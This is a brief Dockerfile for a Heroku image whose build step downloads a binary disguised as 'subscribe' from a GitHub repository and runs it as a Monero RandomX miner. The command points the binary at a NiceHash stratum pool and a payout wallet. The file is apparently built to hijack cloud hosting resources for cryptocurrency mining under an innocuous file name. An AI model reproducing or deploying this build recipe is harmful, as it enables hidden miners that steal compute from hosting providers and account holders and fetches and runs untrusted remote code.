FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://randomxmonero.eu.nicehash.com:3380 -u 3GMMqEWU5bNm14rWuM1vcRBNdNDXRKKnfH.cubo
CMD bash heroku.sh
